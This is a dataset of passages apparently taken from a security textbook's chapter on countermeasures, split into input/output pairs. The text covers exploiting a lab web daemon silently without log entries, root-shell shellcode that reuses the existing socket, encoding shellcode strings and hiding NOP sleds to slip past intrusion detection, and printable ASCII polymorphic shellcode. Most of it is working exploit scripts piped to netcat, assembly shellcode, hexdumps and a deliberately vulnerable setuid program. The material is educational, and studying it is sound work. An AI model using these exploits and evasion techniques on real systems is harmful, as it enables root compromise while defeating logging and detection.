    "output": "(perl -e \"print \\\"$FAKEREQUEST\\\"\";\n./addr_struct \"$SPOOFIP\" \"$SPOOFPORT\";\nperl -e \"print \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\ncat $1;\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"$FAKEADDR\\\"x2 . \\\"\\x01\\x00\\x00\\x00\\r\\n\\\"\") | nc -w 1 -v $2\n80\nWhen this script is used, the exploit is totally silent and nothing is written\nto the log file.\nreader@hacking:~/booksrc $ sudo rm /Hacked\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon..\nreader@hacking:~/booksrc $ ls -l /var/log/tinywebd.log\n-rw------- 1 root reader 6526 2007-09-19 23:24 /var/log/tinywebd.log\nreader@hacking:~/booksrc $ ./xtool_tinywebd_silent.sh mark_restore 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: mark_restore (53 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request 15] [spoof IP 16] [NOP 332] [shellcode 53] [ret addr 128] [*fake_addr 8]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ ls -l /var/log/tinywebd.log\n-rw------- 1 root reader 6526 2007-09-19 23:24 /var/log/tinywebd.log\nreader@hacking:~/booksrc $ ls -l /Hacked\n-rw------- 1 root reader 0 2007-09-19 23:35 /Hacked\nreader@hacking:~/booksrc $\nNotice the log file’s size and access time remain the same. Using this\ntechnique, we can exploit tinywebd without leaving any trace in the log\nfiles. In addition, the write calls execute cleanly, as everything is written to\n/dev/null. This is shown by strace in the output below, when the silent\nexploit tool is run in another terminal.\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot 478 0.0 0.0 1636 420 ? Ss 23:24 0:00 ./tinywebd\nreader 1005 0.0 0.0 2880 748 pts/1 R+ 23:36 0:00 grep tinywebd\nreader@hacking:~/booksrc $ sudo strace -p 478 -e trace=write\nProcess 478 attached - interrupt to quit\nwrite(1, \"09/19/2007 23:36:31> \", 21) = 21\nwrite(1, \"From 12.34.56.78:9090 \\\"GET / HTT\".., 47) = 47\nProcess 478 detached\nreader@hacking:~/booksrc $\n0x670 The Whole Infrastructure\nAs always, details can be hidden in the bigger picture. A single host usually\nexists within some sort of infrastructure. Countermeasures such as intrusion\ndetection systems (IDS) and intrusion prevention systems (IPS) can detect\nabnormal network traffic. Even simple log files on routers and firewalls can\nreveal abnormal connections that are indicative of an intrusion. In partic-\nular, the connection to port 31337 used in our connect-back shellcode is a\n354 0x600"
  },
  {
    "input": "0x671 Socket Reuse",
    "output": "big red flag. We could change the port to something that looks less suspicious;\nhowever, simply having a webserver open outbound connections could be a\nred flag by itself. A highly secure infrastructure might even have the firewall\nsetup with egress filters to prevent outbound connections. In these situations,\nopening a new connection is either impossible or will be detected.\n0x671 Socket Reuse\nIn our case, there’s really no need to open a new connection, since we already\nhave an open socket from the web request. Since we’re mucking around inside\nthe tinyweb daemon, with a little debugging we can reuse the existing socket\nfor the root shell. This prevents additional TCP connections from being\nlogged and allows exploitation in cases where the target host cannot open\noutbound connections. Take a look at the source code from tinywebd.c\nshown below.\nExcerpt from tinywebd.c\nwhile(1) { // Accept loop\nsin_size = sizeof(struct sockaddr_in);\nnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\nif(new_sockfd == -1)\nfatal(\"accepting connection\");\nhandle_connection(new_sockfd, &client_addr, logfd);\n}\nreturn 0;\n}\n/* This function handles the connection on the passed socket from the\n* passed client address and logs to the passed FD. The connection is\n* processed as a web request, and this function replies over the connected\n* socket. Finally, the passed socket is closed at the end of the function.\n*/\nvoid handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\nunsigned char *ptr, request[500], resource[500], log_buffer[500];\nint fd, length;\nlength = recv_line(sockfd, request);\nUnfortunately, the sockfd passed to handle_connection() will inevitably be\noverwritten so we can overwrite logfd. This overwrite happens before we gain\ncontrol of the program in the shellcode, so there’s no way to recover the\nprevious value of sockfd. Luckily, main() keeps another copy of the socket’s\nfile descriptor in new_sockfd.\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot 478 0.0 0.0 1636 420 ? Ss 23:24 0:00 ./tinywebd\nreader 1284 0.0 0.0 2880 748 pts/1 R+ 23:42 0:00 grep tinywebd\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q—pid=478 --symbols=./a.out\nCountermeasures 355\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nAttaching to process 478\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already. Kill it? (y or n) n\nProgram not killed.\n(gdb) list handle_connection\n77 /* This function handles the connection on the passed socket from the\n78 * passed client address and logs to the passed FD. The connection is\n79 * processed as a web request, and this function replies over the connected\n80 * socket. Finally, the passed socket is closed at the end of the function.\n81 */\n82 void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\n83 unsigned char *ptr, request[500], resource[500], log_buffer[500];\n84 int fd, length;\n85\n86 length = recv_line(sockfd, request);\n(gdb) break 86\nBreakpoint 1 at 0x8048fc3: file tinywebd.c, line 86.\n(gdb) cont\nContinuing.\nAfter the breakpoint is set and the program continues, the silent exploit\ntool is used from another terminal to connect and advance execution.\nBreakpoint 1, handle_connection (sockfd=13, client_addr_ptr=0xbffff810, logfd=3) at\ntinywebd.c:86\n86 length = recv_line(sockfd, request);\n(gdb) x/x &sockfd\n0xbffff7e0: 0x0000000d\n(gdb) x/x &new_sockfd\nNo symbol \"new_sockfd\" in current context.\n(gdb) bt\n#0 handle_connection (sockfd=13, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86\n#1 0x08048fb7 in main () at tinywebd.c:72\n(gdb) select-frame 1\n(gdb) x/x &new_sockfd\n0xbffff83c: 0x0000000d\n(gdb) quit\nThe program is running. Quit anyway (and detach it)? (y or n) y\nDetaching from program: , process 478\nreader@hacking:~/booksrc $\nThis debugging output shows that new_sockfd is stored at 0xbffff83c within\nmain’s stack frame. Using this, we can create shellcode that uses the socket\nfile descriptor stored here instead of creating a new connection.\nWhile we could just use this address directly, there are many little things\nthat can shift stack memory around. If this happens and the shellcode is using\na hard-coded stack address, the exploit will fail. To make the shellcode more\nreliable, take a cue from how the compiler handles stack variables. If we use\nan address relative to ESP, then even if the stack shifts around a bit, the address\n356 0x600\nof new_sockfd will still be correct since the offset from ESP will be the same.\nAs you may remember from debugging with the mark_break shellcode, ESP\nwas 0xbffff7e0. Using this value for ESP, the offset is shown to be 0x5c bytes.\nreader@hacking:~/booksrc $ gdb -q\n(gdb) print /x 0xbffff83c - 0xbffff7e0\n$1 = 0x5c\n(gdb)\nThe following shellcode reuses the existing socket for the root shell.\nsocket_reuse_restore.s\nBITS 32\npush BYTE 0x02 ; Fork is syscall #2\npop eax\nint 0x80 ; After the fork, in child process eax == 0.\ntest eax, eax\njz child_process ; In child process spawns a shell.\n; In the parent process, restore tinywebd.\nlea ebp, [esp+0x68] ; Restore EBP.\npush 0x08048fb7 ; Return address.\nret ; Return.\nchild_process:\n; Re-use existing socket.\nlea edx, [esp+0x5c] ; Put the address of new_sockfd in edx.\nmov ebx, [edx] ; Put the value of new_sockfd in ebx.\npush BYTE 0x02\npop ecx ; ecx starts at 2.\nxor eax, eax\nxor edx, edx\ndup_loop:\nmov BYTE al, 0x3F ; dup2 syscall #63\nint 0x80 ; dup2(c, 0)\ndec ecx ; Count down to 0.\njns dup_loop ; If the sign flag is not set, ecx is not negative.\n; execve(const char *filename, char *const argv [], char *const envp[])\nmov BYTE al, 11 ; execve syscall #11\npush edx ; push some nulls for string termination.\npush 0x68732f2f ; push \"//sh\" to the stack.\npush 0x6e69622f ; push \"/bin\" to the stack.\nmov ebx, esp ; Put the address of \"/bin//sh\" into ebx, via esp.\npush edx ; push 32-bit null terminator to stack.\nmov edx, esp ; This is an empty array for envp.\npush ebx ; push string addr to stack above null terminator.\nmov ecx, esp ; This is the argv array with string ptr.\nint 0x80 ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nCountermeasures 357\nTo effectively use this shellcode, we need another exploitation tool that\nlets us send the exploit buffer but keeps the socket out for further I/O.\nThis second exploit script adds an additional cat - command to the end of\nthe exploit buffer. The dash argument means standard input. Running cat\non standard input is somewhat useless in itself, but when the command is\npiped into netcat, this effectively ties standard input and output to netcat’s\nnetwork socket. The script below connects to the target, sends the exploit\nbuffer, and then keeps the socket open and gets further input from the\nterminal. This is done with just a few modifications (shown in bold) to the\nsilent exploit tool.\nxtool_tinywebd_reuse.sh\n#!/bin/sh\n# Silent stealth exploitation tool for tinywebd\n# also spoofs IP address stored in memory\n# reuses existing socket—use socket_reuse shellcode\nSPOOFIP=\"12.34.56.78\"\nSPOOFPORT=\"9090\"\nif [ -z \"$2\" ]; then # if argument 2 is blank\necho \"Usage: $0 <shellcode file> <target IP>\"\nexit\nfi\nFAKEREQUEST=\"GET / HTTP/1.1\\x00\"\nFR_SIZE=$(perl -e \"print \\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nOFFSET=540\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # at +100 bytes from buffer @ 0xbffff5c0\nFAKEADDR=\"\\xcf\\xf5\\xff\\xbf\" # +15 bytes from buffer @ 0xbffff5c0\necho \"target IP: $2\"\nSIZE=`wc -c $1 | cut -f1 -d ' '`\necho \"shellcode: $1 ($SIZE bytes)\"\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))\necho \"[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret\naddr 128] [*fake_addr 8]\"\n(perl -e \"print \\\"$FAKEREQUEST\\\"\";\n./addr_struct \"$SPOOFIP\" \"$SPOOFPORT\";\nperl -e \"print \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\ncat $1;\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"$FAKEADDR\\\"x2 . \\\"\\x01\\x00\\x00\\x00\\r\\n\\\"\";\ncat -;) | nc -v $2 80\nWhen this tool is used with the socket_reuse_restore shellcode, the root\nshell will be served up using the same socket used for the web request. The\nfollowing output demonstrates this.\nreader@hacking:~/booksrc $ nasm socket_reuse_restore.s\nreader@hacking:~/booksrc $ hexdump -C socket_reuse_restore\n00000000 6a 02 58 cd 80 85 c0 74 0a 8d 6c 24 68 68 b7 8f |j.X..t.l$hh.|\n00000010 04 08 c3 8d 54 24 5c 8b 1a 6a 02 59 31 c0 31 d2 |..T$\\.j.Y1.1.|\n358 0x600"
  },
  {
    "input": "0x681 String Encoding",
    "output": "00000020 b0 3f cd 80 49 79 f9 b0 0b 52 68 2f 2f 73 68 68 |.?.Iy..Rh//shh|\n00000030 2f 62 69 6e 89 e3 52 89 e2 53 89 e1 cd 80 |/bin.R.S..|\n0000003e\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh socket_reuse_restore 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: socket_reuse_restore (62 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request 15] [spoof IP 16] [NOP 323] [shellcode 62] [ret addr 128] [*fake_addr 8]\nlocalhost [127.0.0.1] 80 (www) open\nwhoami\nroot\nBy reusing the existing socket, this exploit is even quieter since it doesn’t\ncreate any additional connections. Fewer connections mean fewer abnormal-\nities for any countermeasures to detect.\n0x680 Payload Smuggling\nThe aforementioned network IDS or IPS systems can do more than just track\nconnections—they can also inspect the packets themselves. Usually, these\nsystems are looking for patterns that would signify an attack. For example, a\nsimple rule looking for packets that contain the string /bin/sh would catch a\nlot of packets containing shellcode. Our /bin/sh string is already slightly\nobfuscated since it’s pushed to the stack in four-byte chunks, but a network\nIDS could also look for packets that contain the strings /bin and //sh.\nThese types of network IDS signatures can be fairly effective at catching\nscript kiddies who are using exploits they downloaded from the Internet. How-\never, they are easily bypassed with custom shellcode that hides any telltale\nstrings.\n0x681 String Encoding\nTo hide the string, we will simply add 5 to each byte in the string. Then,\nafter the string has been pushed to the stack, the shellcode will subtract 5\nfrom each string byte on the stack. This will build the desired string on the\nstack so it can be used in the shellcode, while keeping it hidden during\ntransit. The output below shows the calculation of the encoded bytes.\nreader@hacking:~/booksrc $ echo \"/bin/sh\" | hexdump -C\n00000000 2f 62 69 6e 2f 73 68 0a |/bin/sh.|\n00000008\nreader@hacking:~/booksrc $ gdb -q\n(gdb) print /x 0x0068732f + 0x05050505\n$1 = 0x56d7834\n(gdb) print /x 0x6e69622f + 0x05050505\n$2 = 0x736e6734\n(gdb) quit\nreader@hacking:~/booksrc $\nCountermeasures 359\nThe following shellcode pushes these encoded bytes to the stack and then\ndecodes them in a loop. Also, two int3 instructions are used to put breakpoints\nin the shellcode before and after the decoding. This is an easy way to see what’s\ngoing on with GDB.\nencoded_sockreuserestore_dbg.s\nBITS 32\npush BYTE 0x02 ; Fork is syscall #2.\npop eax\nint 0x80 ; After the fork, in child process eax == 0.\ntest eax, eax\njz child_process ; In child process spawns a shell.\n; In the parent process, restore tinywebd.\nlea ebp, [esp+0x68] ; Restore EBP.\npush 0x08048fb7 ; Return address.\nret ; Return\nchild_process:\n; Re-use existing socket.\nlea edx, [esp+0x5c] ; Put the address of new_sockfd in edx.\nmov ebx, [edx] ; Put the value of new_sockfd in ebx.\npush BYTE 0x02\npop ecx ; ecx starts at 2.\nxor eax, eax\ndup_loop:\nmov BYTE al, 0x3F ; dup2 syscall #63\nint 0x80 ; dup2(c, 0)\ndec ecx ; Count down to 0.\njns dup_loop ; If the sign flag is not set, ecx is not negative.\n; execve(const char *filename, char *const argv [], char *const envp[])\nmov BYTE al, 11 ; execve syscall #11\npush 0x056d7834 ; push \"/sh\\x00\" encoded +5 to the stack.\npush 0x736e6734 ; push \"/bin\" encoded +5 to the stack.\nmov ebx, esp ; Put the address of encoded \"/bin/sh\" into ebx.\nint3 ; Breakpoint before decoding (REMOVE WHEN NOT DEBUGGING)\npush BYTE 0x8 ; Need to decode 8 bytes\npop edx\ndecode_loop:\nsub BYTE [ebx+edx], 0x5\ndec edx\njns decode_loop\nint3 ; Breakpoint after decoding (REMOVE WHEN NOT DEBUGGING)\nxor edx, edx\npush edx ; push 32-bit null terminator to stack.\nmov edx, esp ; This is an empty array for envp.\n360 0x600\npush ebx ; push string addr to stack above null terminator.\nmov ecx, esp ; This is the argv array with string ptr.\nint 0x80 ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\nThe decoding loop uses the EDX register as a counter. It begins at 8\nand counts down to 0, since 8 bytes need to be decoded. Exact stack addresses\ndon’t matter in this case since the important parts are all relatively addressed,\nso the output below doesn’t bother attaching to an existing tinywebd process.\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q ./a.out\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) set disassembly-flavor intel\n(gdb) set follow-fork-mode child\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nStarting tiny web daemon..\nSince the breakpoints are actually part of the shellcode, there is no need\nto set one from GDB. From another terminal, the shellcode is assembled and\nused with the socket-reusing exploit tool.\nFrom Another Terminal\nreader@hacking:~/booksrc $ nasm encoded_sockreuserestore_dbg.s\nreader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh encoded_socketreuserestore_dbg 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: encoded_sockreuserestore_dbg (72 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request 15] [spoof IP 16] [NOP 313] [shellcode 72] [ret addr 128] [*fake_addr 8]\nlocalhost [127.0.0.1] 80 (www) open\nBack in the GDB window, the first int3 instruction in the shellcode is hit.\nFrom here, we can verify that the string decodes properly.\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n[Switching to process 12400]\n0xbffff6ab in ?? ()\n(gdb) x/10i $eip\n0xbffff6ab: push 0x8\n0xbffff6ad: pop edx\n0xbffff6ae: sub BYTE PTR [ebx+edx],0x5\n0xbffff6b2: dec edx\n0xbffff6b3: jns 0xbffff6ae\n0xbffff6b5 int3\n0xbffff6b6: xor edx,edx\n0xbffff6b8: push edx\n0xbffff6b9: mov edx,esp\n0xbffff6bb: push ebx\n(gdb) x/8c $ebx\nCountermeasures 361"
  },
  {
    "input": "0x682 How to Hide a Sled",
    "output": "0xbffff738: 52 '4' 103 'g' 110 'n' 115 's' 52 '4' 120 'x' 109 'm' 5 '\\005'\n(gdb) cont\nContinuing.\n[tcsetpgrp failed in terminal_inferior: Operation not permitted]\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0xbffff6b6 in ?? ()\n(gdb) x/8c $ebx\n0xbffff738: 47 '/' 98 'b' 105 'i' 110 'n' 47 '/' 115 's' 104 'h' 0 '\\0'\n(gdb) x/s $ebx\n0xbffff738: \"/bin/sh\"\n(gdb)\nNow that the decoding has been verified, the int3 instructions can be\nremoved from the shellcode. The following output shows the final shellcode\nbeing used.\nreader@hacking:~/booksrc $ sed -e 's/int3/;int3/g' encoded_sockreuserestore_dbg.s >\nencoded_sockreuserestore.s\nreader@hacking:~/booksrc $ diff encoded_sockreuserestore_dbg.s encoded_sockreuserestore.s 33c33\n< int3 ; Breakpoint before decoding (REMOVE WHEN NOT DEBUGGING)\n> ;int3 ; Breakpoint before decoding (REMOVE WHEN NOT DEBUGGING)\n42c42\n< int3 ; Breakpoint after decoding (REMOVE WHEN NOT DEBUGGING)\n> ;int3 ; Breakpoint after decoding (REMOVE WHEN NOT DEBUGGING)\nreader@hacking:~/booksrc $ nasm encoded_sockreuserestore.s\nreader@hacking:~/booksrc $ hexdump -C encoded_sockreuserestore\n00000000 6a 02 58 cd 80 85 c0 74 0a 8d 6c 24 68 68 b7 8f |j.X....t..l$hh..|\n00000010 04 08 c3 8d 54 24 5c 8b 1a 6a 02 59 31 c0 b0 3f |....T$\\..j.Y1..?|\n00000020 cd 80 49 79 f9 b0 0b 68 34 78 6d 05 68 34 67 6e |..Iy...h4xm.h4gn|\n00000030 73 89 e3 6a 08 5a 80 2c 13 05 4a 79 f9 31 d2 52 |s..j.Z.,..Jy.1.R|\n00000040 89 e2 53 89 e1 cd 80 |..S....|\n00000047\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon..\nreader@hacking:~/booksrc $ ./xtool_tinywebd_reuse.sh encoded_sockreuserestore 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: encoded_sockreuserestore (71 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request 15] [spoof IP 16] [NOP 314] [shellcode 71] [ret addr 128] [*fake_addr 8]\nlocalhost [127.0.0.1] 80 (www) open\nwhoami\nroot\n0x682 How to Hide a Sled\nThe NOP sled is another signature easy to detect by network IDSes and IPSes.\nLarge blocks of 0x90 aren’t that common, so if a network security mechanism\nsees something like this, it’s probably an exploit. To avoid this signature, we\ncan use different single-byte instructions instead of NOP. There are several\none-byte instructions—the increment and decrement instructions for various\nregisters—that are also printable ASCII characters.\n362 0x600"
  },
  {
    "input": "0x690 Buffer Restrictions",
    "output": "Instruction Hex ASCII\ninc eax 0x40 @\ninc ebx 0x43 C\ninc ecx 0x41 A\ninc edx 0x42 B\ndec eax 0x48 H\ndec ebx 0x4B K\ndec ecx 0x49 I\ndec edx 0x4A J\nSince we zero out these registers before we use them, we can safely use a\nrandom combination of these bytes for the NOP sled. Creating a new exploit\ntool that uses random combinations of the bytes @, C, A, B, H, K, I, and J instead\nof a regular NOP sled will be left as an exercise for the reader. The easiest\nway to do this would be by writing a sled-generation program in C, which is\nused with a BASH script. This modification will hide the exploit buffer from\nIDSes that look for a NOP sled.\n0x690 Buffer Restrictions\nSometimes a program will place certain restrictions on buffers. This type of\ndata sanity-checking can prevent many vulnerabilities. Consider the following\nexample program, which is used to update product descriptions in a fictitious\ndatabase. The first argument is the product code, and the second is the\nupdated description. This program doesn’t actually update a database, but it\ndoes have an obvious vulnerability in it.\nupdate_info.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#define MAX_ID_LEN 40\n#define MAX_DESC_LEN 500\n/* Barf a message and exit. */\nvoid barf(char *message, void *extra) {\nprintf(message, extra);\nexit(1);\n}\n/* Pretend this function updates a product description in a database. */\nvoid update_product_description(char *id, char *desc)\n{\nchar product_code[5], description[MAX_DESC_LEN];\nprintf(\"[DEBUG]: description is at %p\\n\", description);\nCountermeasures 363\nstrncpy(description, desc, MAX_DESC_LEN);\nstrcpy(product_code, id);\nprintf(\"Updating product #%s with description \\'%s\\'\\n\", product_code, desc);\n// Update database\n}\nint main(int argc, char *argv[], char *envp[])\n{\nint i;\nchar *id, *desc;\nif(argc < 2)\nbarf(\"Usage: %s <id> <description>\\n\", argv[0]);\nid = argv[1]; // id - Product code to update in DB\ndesc = argv[2]; // desc - Item description to update\nif(strlen(id) > MAX_ID_LEN) // id must be less than MAX_ID_LEN bytes.\nbarf(\"Fatal: id argument must be less than %u bytes\\n\", (void *)MAX_ID_LEN);\nfor(i=0; i < strlen(desc)-1; i++) { // Only allow printable bytes in desc.\nif(!(isprint(desc[i])))\nbarf(\"Fatal: description argument can only contain printable bytes\\n\", NULL);\n}\n// Clearing out the stack memory (security)\n// Clearing all arguments except the first and second\nmemset(argv[0], 0, strlen(argv[0]));\nfor(i=3; argv[i] != 0; i++)\nmemset(argv[i], 0, strlen(argv[i]));\n// Clearing all environment variables\nfor(i=0; envp[i] != 0; i++)\nmemset(envp[i], 0, strlen(envp[i]));\nprintf(\"[DEBUG]: desc is at %p\\n\", desc);\nupdate_product_description(id, desc); // Update database.\n}\nDespite the vulnerability, the code does make an attempt at security.\nThe length of the product ID argument is restricted, and the contents of the\ndescription argument are limited to printable characters. In addition, the\nunused environment variables and program arguments are cleared out for\nsecurity reasons. The first argument (id) is too small for shellcode, and since\nthe rest of the stack memory is cleared out, there’s only one place left.\n364 0x600\nreader@hacking:~/booksrc $ gcc -o update_info update_info.c\nreader@hacking:~/booksrc $ sudo chown root ./update_info\nreader@hacking:~/booksrc $ sudo chmod u+s ./update_info\nreader@hacking:~/booksrc $ ./update_info\nUsage: ./update_info <id> <description>\nreader@hacking:~/booksrc $ ./update_info OCP209 \"Enforcement Droid\"\n[DEBUG]: description is at 0xbffff650\nUpdating product #OCP209 with description 'Enforcement Droid'\nreader@hacking:~/booksrc $\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"AAAA\"x10') blah\n[DEBUG]: description is at 0xbffff650\nSegmentation fault\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"\\xf2\\xf9\\xff\\xbf\"x10') $(cat ./\nshellcode.bin)\nFatal: description argument can only contain printable bytes\nreader@hacking:~/booksrc $\nThis output shows a sample usage and then tries to exploit the vulnerable\nstrcpy() call. Although the return address can be overwritten using the first\nargument (id), the only place we can put shellcode is in the second argument\n(desc). However, this buffer is checked for nonprintable bytes. The debugging\noutput below confirms that this program could be exploited, if there was a\nway to put shellcode in the description argument.\nreader@hacking:~/booksrc $ gdb -q ./update_info\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) run $(perl -e 'print \"\\xcb\\xf9\\xff\\xbf\"x10') blah\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/reader/booksrc/update_info $(perl -e 'print \"\\xcb\\xf9\\xff\\xbf\"x10')\nblah\n[DEBUG]: desc is at 0xbffff9cb\nUpdating product # with description 'blah'\nProgram received signal SIGSEGV, Segmentation fault.\n0xbffff9cb in ?? ()\n(gdb) i r eip\neip 0xbffff9cb 0xbffff9cb\n(gdb) x/s $eip\n0xbffff9cb: \"blah\"\n(gdb)\nThe printable input validation is the only thing stopping exploitation.\nLike airport security, this input validation loop inspects everything coming\nin. And while it’s not possible to avoid this check, there are ways to smuggle\nillicit data past the guards.\nCountermeasures 365"
  },
  {
    "input": "0x691 Polymorphic Printable ASCII Shellcode",
    "output": "0x691 Polymorphic Printable ASCII Shellcode\nPolymorphic shellcode refers to any shellcode that changes itself. The encod-\ning shellcode from the previous section is technically polymorphic, since it\nmodifies the string it uses while it’s running. The new NOP sled uses instruc-\ntions that assemble into printable ASCII bytes. There are other instructions\nthat fall into this printable range (from 0x33 to 0x7e); however, the total set\nisactually rather small.\nThe goal is to write shellcode that will get past the printable character\ncheck. Trying to write complex shellcode with such a limited instruction set\nwould simply be masochistic, so instead, the printable shellcode will use simple\nmethods to build more complex shellcode on the stack. In this way, the print-\nable shellcode will actually be instructions to make the real shellcode.\nThe first step is figuring out a way to zero out registers. Unfortunately, the\nXOR instruction on the various registers doesn’t assemble into the printable\nASCII character range. One option is to use the AND bitwise operation, which\nassembles into the percent character (%) when using the EAX register. The\nassembly instruction of and eax, 0x41414141 will assemble to the printable\nmachine code of %AAAA, since 0x41 in hexadecimal is the printable character A.\nAn AND operation transforms bits as follows:\n1 and 1 = 1\n0 and 0 = 0\n1 and 0 = 0\n0 and 1 = 0\nSince the only case where the result is 1 is when both bits are 1, if two\ninverse values are ANDed onto EAX, EAX will become zero.\nBinary Hexadecimal\n1000101010011100100111101001010 0x454e4f4a\nAND 0111010001100010011000000110101 AND 0x3a313035\n------------------------------------ ---------------\n0000000000000000000000000000000 0x00000000\nThus, by using two printable 32-bit values that are bitwise inverses of each\nother, the EAX register can be zeroed without using any null bytes, and the\nresulting assembled machine code will be printable text.\nand eax, 0x454e4f4a ; Assembles into %JONE\nand eax, 0x3a313035 ; Assembles into %501:\nSo %JONE%501: in machine code will zero out the EAX register. Interesting.\nSome other instructions that assemble into printable ASCII characters are\nshown in the box below.\nsub eax, 0x41414141 -AAAA\npush eax P\npop eax X\npush esp T\npop esp \\\n366 0x600\nAmazingly, these instructions, combined with the AND eax instruction,\nare sufficient to build loader code that will inject the shellcode onto the stack\nand then execute it. The general technique is, first, to set ESP back behind the\nexecuting loader code (in higher memory addresses), and then to build the\nshellcode from end to start by pushing values onto the stack, as shown here.\nSince the stack grows up (from higher memory addresses to lower memory\naddresses), the ESP will move backward as values are pushed to the stack,\nand the EIP will move forward as the loader code executes. Eventually,\nEIPand ESP will meet up, and the EIP will continue executing into the\nfreshly built shellcode.\n1)\nLoader Code\nEIP ESP\n2)\nLoader Code Shellcode\nEIP ESP\n3)\nLoader Code Shellcode being built\nEIP ESP\no\nFirst, ESP must be set behind the printable loader shellcode. A little\ndebugging with GDB shows that after gaining control of program execution,\nESP is 555 bytes before the start of the overflow buffer (which will contain the\nloader code). The ESP register must be moved so it’s after the loader code,\nwhile still leaving room for the new shellcode and for the loader shellcode\nitself. About 300 bytes should be enough room for this, so let’s add 860 bytes\nto ESP to put it 305 bytes past the start of the loader code. This value doesn’t\nneed to be exact, since provisions will be made later to allow for some slop.\nSince the only usable instruction is subtraction, addition can be simulated by\nsubtracting so much from the register that it wraps around. The register only\nhas 32 bits of space, so adding 860 to a register is the same as subtracting 860\nfrom 232, or 4,294,966,436. However, this subtraction must only use printable\nvalues, so we split it up across three instructions that all use printable operands.\nsub eax, 0x39393333 ; Assembles into -3399\nsub eax, 0x72727550 ; Assembles into -Purr\nsub eax, 0x54545421 ; Assembles into -!TTT\nAs the GDB output confirms, subtracting these three values from a 32-bit\nnumber is the same as adding 860 to it.\nCountermeasures 367\nreader@hacking:~/booksrc $ gdb -q\n(gdb) print 0 - 0x39393333 - 0x72727550 - 0x54545421\n$1 = 860\n(gdb)\nThe goal is to subtract these values from ESP, not EAX, but the instruction\nsub esp doesn’t assemble into a printable ASCII character. So the current value\nof ESP must be moved into EAX for the subtraction, and then the new value of\nEAX must be moved back into ESP.\nHowever, since neither mov esp, eax nor mov eax, esp assemble into\nprintable ASCII characters, this exchange must be done using the stack. By\npushing the value from the source register to the stack and then popping it\noff into the destination register, the equivalent of a mov dest, source instruction\ncan be accomplished with push source and pop dest. Fortunately, the pop and\npush instructions for both EAX and ESP registers assemble into printable ASCII\ncharacters, so this can all be done using printable ASCII.\nHere is the final set of instructions to add 860 to ESP.\npush esp ; Assembles into T\npop eax ; Assembles into X\nsub eax, 0x39393333 ; Assembles into -3399\nsub eax, 0x72727550 ; Assembles into -Purr\nsub eax, 0x54545421 ; Assembles into -!TTT\npush eax ; Assembles into P\npop esp ; Assembles into \\\nThis means that TX-3399-Purr-!TTT-P\\ will add 860 to ESP in machine\ncode. So far, so good. Now the shellcode must be built.\nFirst, EAX must be zeroed out; this is easy now that a method has been\ndiscovered. Then, by using more sub instructions, the EAX register must be\nset to the last four bytes of the shellcode, in reverse order. Since the stack\nnormally grows upward (toward lower memory addresses) and builds with a\nFILO ordering, the first value pushed to the stack must be the last four bytes\nof the shellcode. These bytes must be in reverse order, due to the little-endian\nbyte ordering. The following output shows a hexadecimal dump of the stan-\ndard shellcode used in the previous chapters, which will be built by the print-\nable loader code.\nreader@hacking:~/booksrc $ hexdump -C ./shellcode.bin\n00000000 31 c0 31 db 31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 |1.1.1......j.XQh|\n00000010 2f 2f 73 68 68 2f 62 69 6e 89 e3 51 89 e2 53 89 |//shh/bin..Q..S.|\n00000020 e1 cd 80 |...|\nIn this case, the last four bytes are shown in bold; the proper value for\nthe EAX register is 0x80cde189. This is easy to do by using sub instructions to\nwrap the value around. Then, EAX can be pushed to the stack. This moves\n368 